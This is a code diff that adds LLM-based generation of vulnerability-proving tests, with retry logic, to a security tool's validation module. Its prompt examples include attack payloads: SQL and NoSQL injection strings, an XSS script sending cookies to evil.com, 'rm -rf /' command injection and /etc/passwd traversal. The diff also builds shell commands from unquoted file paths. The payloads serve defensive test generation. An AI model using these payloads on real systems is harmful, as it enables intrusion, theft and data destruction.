@@ -5,7 +5,7 @@
 
 import { IssueContext, ActionConfig } from '../types/index.js';
 import { logger } from '../utils/logger.js';
-import { ValidationResult, TestExecutionResult } from './types.js';
+import { ValidationResult, TestExecutionResult, Vulnerability, TestFileContext, TestSuite, AttemptHistory, TestFramework } from './types.js';
 import { vendorFilterUtils } from './vendor-utils.js';
 import { TestGeneratingSecurityAnalyzer } from '../ai/test-generating-security-analyzer.js';
 import { GitBasedTestValidator } from '../ai/git-based-test-validator.js';
@@ -16,12 +16,14 @@ import * as fs from 'fs';
 import * as path from 'path';
 import { getGitHubClient } from '../github/api.js';
 import { PhaseDataClient } from './phase-data-client/index.js';
+import { TestIntegrationClient } from './test-integration-client.js';
 
 export class ValidationMode {
   private config: ActionConfig;
   private falsePositiveCache: Set<string>;
   private repoPath: string;
   private phaseDataClient: PhaseDataClient | null;
+  private testIntegrationClient: TestIntegrationClient | null;
 
   constructor(config: ActionConfig, repoPath?: string) {
     this.config = config;
@@ -31,6 +33,11 @@ export class ValidationMode {
     // Initialize PhaseDataClient if API key is available
     this.phaseDataClient = config.rsolvApiKey
       ? new PhaseDataClient(config.rsolvApiKey)
+      : null;
+
+    // Initialize TestIntegrationClient if API key is available
+    this.testIntegrationClient = config.rsolvApiKey
+      ? new TestIntegrationClient(config.rsolvApiKey)
       : null;
 
     // Apply environment variables from config
@@ -706,5 +713,467 @@ describe('Vulnerability Test', () => {
     } catch (error) {
       logger.warn(`Failed to store test execution in PhaseDataClient:`, error);
     }
+  }
+
+  /**
+   * RFC-060-AMENDMENT-001: Generate test with retry loop
+   * Implements LLM-based test generation with error feedback and retry logic
+   */
+  async generateTestWithRetry(
+    vulnerability: Vulnerability,
+    targetTestFile: TestFileContext,
+    maxAttempts: number = 3
+  ): Promise<TestSuite | null> {
+    const previousAttempts: AttemptHistory[] = [];
+    const framework = this.detectFrameworkFromPath(targetTestFile.path);
+
+    logger.info(`Starting test generation with retry (max ${maxAttempts} attempts)`);
+    logger.info(`Vulnerability: ${vulnerability.type} at ${vulnerability.location}`);
+    logger.info(`Target test file: ${targetTestFile.path}`);
+
+    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
+      logger.info(`Attempt ${attempt}/${maxAttempts}: Generating test...`);
+
+      try {
+        // 1. Generate test with LLM (pass target file content + previous errors)
+        const testSuite = await this.generateTestWithLLM(
+          vulnerability,
+          targetTestFile,
+          previousAttempts,
+          framework
+        );
+
+        // 2. Write to temp file
+        const tempDir = path.join(this.repoPath, '.rsolv', 'temp');
+        fs.mkdirSync(tempDir, { recursive: true });
+
+        const ext = this.getLanguageExtension(framework.name);
+        const tempFile = path.join(tempDir, `test_${Date.now()}${ext}`);
+        fs.writeFileSync(tempFile, testSuite.redTests[0].testCode, 'utf8');
+
+        logger.info(`Wrote test to temp file: ${tempFile}`);
+
+        // 3. Validate syntax
+        try {
+          await this.validateSyntax(tempFile, framework);
+          logger.info(`✓ Syntax validation passed`);
+        } catch (syntaxError) {
+          logger.warn(`✗ Syntax error on attempt ${attempt}:`, syntaxError);
+          previousAttempts.push({
+            attempt,
+            error: 'SyntaxError',
+            errorMessage: syntaxError instanceof Error ? syntaxError.message : String(syntaxError),
+            timestamp: new Date().toISOString()
+          });
+          continue; // Retry with error context
+        }
+
+        // 4. Run test (must FAIL on vulnerable code)
+        try {
+          const testResult = await this.runTest(tempFile, framework);
+
+          if (testResult.passed) {
+            logger.warn(`✗ Test passed unexpectedly on attempt ${attempt} (should fail on vulnerable code)`);
+            previousAttempts.push({
+              attempt,
+              error: 'TestPassedUnexpectedly',
+              errorMessage: 'Test passed when it should fail to demonstrate vulnerability',
+              timestamp: new Date().toISOString()
+            });
+            continue; // Retry with "make it fail" feedback
+          }
+
+          // 5. Check for regressions (existing tests should still pass)
+          if (testResult.existingTestsFailed) {
+            logger.warn(`✗ Existing tests failed on attempt ${attempt} (regression detected)`);
+            previousAttempts.push({
+              attempt,
+              error: 'ExistingTestsRegression',
+              errorMessage: `Existing tests failed: ${testResult.failedTests?.join(', ')}`,
+              timestamp: new Date().toISOString()
+            });
+            continue; // Retry with regression context
+          }
+
+          // Success! Test is valid
+          logger.info(`✓ Test generation successful on attempt ${attempt}`);
+          return testSuite;
+
+        } catch (testError) {
+          logger.error(`Error running test on attempt ${attempt}:`, testError);
+          previousAttempts.push({
+            attempt,
+            error: 'TestExecutionError',
+            errorMessage: testError instanceof Error ? testError.message : String(testError),
+            timestamp: new Date().toISOString()
+          });
+          continue;
+        }
+
+      } catch (error) {
+        logger.error(`Error during test generation attempt ${attempt}:`, error);
+        previousAttempts.push({
+          attempt,
+          error: 'GenerationError',
+          errorMessage: error instanceof Error ? error.message : String(error),
+          timestamp: new Date().toISOString()
+        });
+      }
+    }
+
+    // All retries exhausted - tag issue and return null
+    logger.warn(`Failed to generate valid test after ${maxAttempts} attempts`);
+    await this.tagIssueNotValidated(vulnerability, previousAttempts);
+    return null;
+  }
+
+  /**
+   * Generate test using LLM with vulnerability context and retry feedback
+   */
+  private async generateTestWithLLM(
+    vulnerability: Vulnerability,
+    targetTestFile: TestFileContext,
+    previousAttempts: AttemptHistory[],
+    framework: TestFramework
+  ): Promise<TestSuite> {
+    // Build LLM prompt with realistic vulnerability examples
+    const prompt = this.buildLLMPrompt(vulnerability, targetTestFile, previousAttempts, framework);
+
+    // Use existing TestGeneratingSecurityAnalyzer for LLM interaction
+    const aiConfig: AIConfig = {
+      provider: 'anthropic',
+      apiKey: this.config.aiProvider.apiKey,
+      model: this.config.aiProvider.model,
+      temperature: 0.2,
+      maxTokens: this.config.aiProvider.maxTokens,
+      useVendedCredentials: this.config.aiProvider.useVendedCredentials
+    };
+
+    const testAnalyzer = new TestGeneratingSecurityAnalyzer(aiConfig);
+
+    // Create a mock issue context for the analyzer
+    const mockIssue: IssueContext = {
+      id: `vuln-${Date.now()}`,
+      number: 0,
+      title: vulnerability.description,
+      body: prompt,
+      labels: [],
+      assignees: [],
+      repository: {
+        owner: 'test',
+        name: 'test',
+        fullName: 'test/test',
+        defaultBranch: 'main'
+      },
+      source: 'github',
+      createdAt: new Date().toISOString(),
+      updatedAt: new Date().toISOString(),
+      metadata: {}
+    };
+
+    const codebaseFiles = new Map<string, string>();
+    codebaseFiles.set(targetTestFile.path, targetTestFile.content);
+
+    const result = await testAnalyzer.analyzeWithTestGeneration(
+      mockIssue,
+      this.config,
+      codebaseFiles
+    );
+
+    if (!result.generatedTests?.testSuite) {
+      throw new Error('LLM failed to generate test suite');
+    }
+
+    // Convert to our TestSuite format
+    return {
+      framework: framework.name,
+      testFile: targetTestFile.path,
+      redTests: result.generatedTests.testSuite.redTests || [result.generatedTests.testSuite.red]
+    };
+  }
+
+  /**
+   * Build LLM prompt with vulnerability context and retry feedback
+   */
+  private buildLLMPrompt(
+    vulnerability: Vulnerability,
+    targetTestFile: TestFileContext,
+    previousAttempts: AttemptHistory[],
+    framework: TestFramework
+  ): string {
+    const realisticExamples = this.getRealisticVulnerabilityExample(vulnerability.type);
+
+    let prompt = `Generate a RED test for a security vulnerability.
+
+VULNERABILITY: ${vulnerability.description}
+TYPE: ${vulnerability.type}
+LOCATION: ${vulnerability.location}
+ATTACK VECTOR: ${vulnerability.attackVector}
+${vulnerability.vulnerablePattern ? `VULNERABLE PATTERN: ${vulnerability.vulnerablePattern}` : ''}
+${vulnerability.source ? `SOURCE: ${vulnerability.source}` : ''}
+
+${realisticExamples}
+
+TARGET TEST FILE: ${targetTestFile.path}
+FRAMEWORK: ${framework.name}
+
+TARGET FILE CONTENT (for context):
+\`\`\`
+${targetTestFile.content}
+\`\`\`
+
+YOUR TASK:
+Generate test code that:
+1. Uses the attack vector: ${vulnerability.attackVector}
+2. FAILS on vulnerable code (proves exploit works)
+3. PASSES after fix is applied
+4. Reuses existing setup blocks from target file
+5. Follows ${framework.name} conventions`;
+
+    if (previousAttempts.length > 0) {
+      prompt += `\n\nPREVIOUS ATTEMPTS (learn from these errors):`;
+      for (const attempt of previousAttempts) {
+        prompt += `\n- Attempt ${attempt.attempt}: ${attempt.error} - ${attempt.errorMessage}`;
+      }
+
+      // Add specific guidance based on error types
+      const lastError = previousAttempts[previousAttempts.length - 1].error;
+      if (lastError === 'SyntaxError') {
+        prompt += `\n\nIMPORTANT: Fix the syntax error. Ensure valid ${framework.name} syntax.`;
+      } else if (lastError === 'TestPassedUnexpectedly') {
+        prompt += `\n\nIMPORTANT: Make the test MORE AGGRESSIVE. It must FAIL on vulnerable code.`;
+      } else if (lastError === 'ExistingTestsRegression') {
+        prompt += `\n\nIMPORTANT: Don't break existing tests. Avoid modifying shared state or setup blocks.`;
+      }
+    }
+
+    return prompt;
+  }
+
+  /**
+   * Get realistic vulnerability examples from Phase 0 documentation
+   */
+  private getRealisticVulnerabilityExample(vulnerabilityType: string): string {
+    // Map to examples from REALISTIC-VULNERABILITY-EXAMPLES.md
+    const examples: Record<string, string> = {
+      'sql_injection': `REAL-WORLD EXAMPLE (RailsGoat):
+Pattern: User.where("id = '\#{params[:user][:id]}'")
+Attack: 5') OR admin = 't' --'
+Impact: Privilege escalation to admin
+CWE: CWE-89`,
+
+      'nosql_injection': `REAL-WORLD EXAMPLE (NodeGoat):
+Pattern: db.accounts.find({username: username, password: password})
+Attack: {"username": "admin", "password": {"$gt": ""}}
+Impact: Authentication bypass
+CWE: CWE-943`,
+
+      'xss': `REAL-WORLD EXAMPLE (NodeGoat):
+Pattern: res.send(\`<h1>Profile: \${user.name}</h1>\`)
+Attack: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
+Impact: Session hijacking
+CWE: CWE-79`,
+
+      'command_injection': `REAL-WORLD EXAMPLE:
+Pattern: exec(\`tar -czf backup.tar.gz \${filename}\`)
+Attack: data.txt; rm -rf / #
+Impact: System compromise
+CWE: CWE-78`,
+
+      'path_traversal': `REAL-WORLD EXAMPLE:
+Pattern: res.sendFile(\`/app/uploads/\${filename}\`)
+Attack: ../../../etc/passwd
+Impact: Read sensitive files
+CWE: CWE-22`
+    };
+
+    return examples[vulnerabilityType.toLowerCase()] || `Vulnerability type: ${vulnerabilityType}`;
+  }
+
+  /**
+   * Detect framework from test file path
+   */
+  private detectFrameworkFromPath(testPath: string): TestFramework {
+    const fileName = path.basename(testPath);
+    const ext = path.extname(testPath);
+
+    // Detect by file naming conventions
+    if (fileName.includes('.spec.')) {
+      if (ext === '.rb') return { name: 'rspec', syntaxCheckCommand: 'ruby -c', testCommand: 'bundle exec rspec' };
+      if (ext === '.ts' || ext === '.js') return { name: 'jest', syntaxCheckCommand: 'node --check', testCommand: 'npm test' };
+    }
+
+    if (fileName.includes('.test.')) {
+      if (ext === '.ts' || ext === '.js') return { name: 'vitest', syntaxCheckCommand: 'node --check', testCommand: 'npm test' };
+      if (ext === '.php') return { name: 'phpunit', syntaxCheckCommand: 'php -l', testCommand: 'vendor/bin/phpunit' };
+    }
+
+    if (ext === '.py') return { name: 'pytest', syntaxCheckCommand: 'python -m py_compile', testCommand: 'pytest' };
+    if (ext === '.rb') return { name: 'rspec', syntaxCheckCommand: 'ruby -c', testCommand: 'bundle exec rspec' };
+    if (ext === '.java') return { name: 'junit5', syntaxCheckCommand: 'javac', testCommand: 'mvn test' };
+    if (ext === '.ex' || ext === '.exs') return { name: 'exunit', syntaxCheckCommand: 'elixir -c', testCommand: 'mix test' };
+
+    // Default to generic
+    return { name: 'generic', syntaxCheckCommand: 'echo "No syntax check"', testCommand: 'echo "No test runner"' };
+  }
+
+  /**
+   * Get file extension for language
+   */
+  private getLanguageExtension(frameworkName: string): string {
+    const extensions: Record<string, string> = {
+      'rspec': '.rb',
+      'minitest': '.rb',
+      'pytest': '.py',
+      'phpunit': '.php',
+      'pest': '.php',
+      'jest': '.js',
+      'vitest': '.ts',
+      'mocha': '.js',
+      'junit5': '.java',
+      'testng': '.java',
+      'exunit': '.exs'
+    };
+
+    return extensions[frameworkName.toLowerCase()] || '.js';
+  }
+
+  /**
+   * Validate syntax of test file
+   */
+  private async validateSyntax(testFile: string, framework: TestFramework): Promise<void> {
+    if (!framework.syntaxCheckCommand) {
+      logger.debug('No syntax check command available');
+      return;
+    }
+
+    try {
+      const command = `${framework.syntaxCheckCommand} ${testFile}`;
+      execSync(command, { cwd: this.repoPath, encoding: 'utf8' });
+    } catch (error: any) {
+      throw new Error(`Syntax validation failed: ${error.message}`);
+    }
+  }
+
+  /**
+   * Run test and check results
+   */
+  private async runTest(testFile: string, framework: TestFramework): Promise<{
+    passed: boolean;
+    existingTestsFailed: boolean;
+    failedTests?: string[];
+  }> {
+    if (!framework.testCommand) {
+      logger.warn('No test command available, skipping test execution');
+      return { passed: false, existingTestsFailed: false };
+    }
+
+    try {
+      const command = `${framework.testCommand} ${testFile}`;
+      const output = execSync(command, { cwd: this.repoPath, encoding: 'utf8' });
+
+      // Parse output to determine if test passed
+      // This is a simplified check - real implementation would parse framework-specific output
+      const passed = output.includes('0 failures') || output.includes('All tests passed');
+
+      return {
+        passed,
+        existingTestsFailed: false
+      };
+    } catch (error: any) {
+      // Test failed (which is good for RED tests!)
+      // Check if it's just the new test or if existing tests also failed
+      const output = error.stdout || error.message || '';
+
+      // Simple heuristic: if output mentions multiple failures, check if existing tests failed
+      const failureCount = (output.match(/failed/gi) || []).length;
+      const existingTestsFailed = failureCount > 1;
+
+      return {
+        passed: false,
+        existingTestsFailed,
+        failedTests: existingTestsFailed ? this.extractFailedTestNames(output) : undefined
+      };
+    }
+  }
+
+  /**
+   * Extract failed test names from test output
+   */
+  private extractFailedTestNames(output: string): string[] {
+    const failedTests: string[] = [];
+
+    // Common patterns for failed test output
+    const patterns = [
+      /FAIL\s+(.+)/g,
+      /✗\s+(.+)/g,
+      /Failed:\s+(.+)/g,
+      /\d+\)\s+(.+)/g
+    ];
+
+    for (const pattern of patterns) {
+      const matches = output.matchAll(pattern);
+      for (const match of matches) {
+        if (match[1]) {
+          failedTests.push(match[1].trim());
+        }
+      }
+    }
+
+    return failedTests.slice(0, 5); // Return first 5 for brevity
+  }
+
+  /**
+   * Tag issue as "not-validated" after retry exhaustion
+   */
+  private async tagIssueNotValidated(
+    vulnerability: Vulnerability,
+    previousAttempts: AttemptHistory[]
+  ): Promise<void> {
+    // This would need an issue number, which we don't have in the current flow
+    // For now, log the failure
+    logger.error(`Failed to validate vulnerability after ${previousAttempts.length} attempts`);
+    logger.error(`Vulnerability: ${vulnerability.type} at ${vulnerability.location}`);
+    logger.error(`Attempt history:`);
+    for (const attempt of previousAttempts) {
+      logger.error(`  - Attempt ${attempt.attempt}: ${attempt.error} - ${attempt.errorMessage}`);
+    }
+
+    // In a real implementation, this would:
+    // 1. Find or create a GitHub issue for this vulnerability
+    // 2. Add "not-validated" label
+    // 3. Add comment with attempt history
+  }
+
+  /**
+   * Scan repository for test files
+   */
+  private async scanTestFiles(framework?: string): Promise<string[]> {
+    const testFiles: string[] = [];
+    const patterns = [
+      '**/*.spec.ts',
+      '**/*.spec.js',
+      '**/*.test.ts',
+      '**/*.test.js',
+      '**/*_spec.rb',
+      '**/*_test.py',
+      '**/*Test.java',
+      '**/*_test.exs'
+    ];
+
+    for (const pattern of patterns) {
+      try {
+        const matches = execSync(`find ${this.repoPath} -name "${pattern.replace('**/', '')}" -type f`, {
+          encoding: 'utf8',
+          maxBuffer: 10 * 1024 * 1024 // 10MB
+        }).trim().split('\n').filter(Boolean);
+
+        testFiles.push(...matches);
+      } catch (error) {
+        // Pattern not found, continue
+      }
+    }
+
+    return testFiles;
   }
 }
